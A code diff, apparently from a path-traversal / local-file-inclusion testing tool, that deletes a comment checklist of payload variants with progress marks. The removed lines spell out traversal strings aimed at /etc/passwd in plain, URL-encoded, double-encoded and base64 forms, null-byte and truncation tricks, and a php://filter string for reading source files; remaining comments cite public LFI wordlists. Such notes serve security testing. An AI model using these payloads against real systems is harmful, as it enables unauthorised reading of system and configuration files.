@@ -1,22 +1,3 @@
-# options to make
-# 1. absolute path                                                                                              DONE
-# dir traversal with ../../../                                                                                  DONE     
-# dir traversal but starts with /../../../ to go arount filename prefixes                                       DONE 
-# use alternative traversals for nonrecursive ../ detection:
-#   ....//, ..././, ....\/, ....////                                                                            DONE
-# use double //: ..//..//..//                                                                                   DONE
-# use urlencoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                                                      DONE
-# use double urlencoding: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd                           DONE
-# -- use base64 encoding: Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==                                                      DONE 
-# -- use double base64 encoding: TGk0dkxpNHZMaTR2TGk0dlpYUmpMM0JoYzNOM1pBPT0=                                   DONE 
-# start the string off with valid path: ./languages/../../../../etc/passwd                                      HOW????????
-# start the string off with invalid path: a/../../../etc/passwd                                                 DONE 
-# -- OLD php string truncation: ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
-# nullbytes with /etc/passwd%00                                                                                 DONE
-# read source code php://filter/read=convert.base64-encode/resource=config                                      NEED TO TRY LOTTA FILENAMES
-# try \ instead of /                                                                                            DONE
-# php filters                                                                                                   FAT
-
 # used https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 # and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
 
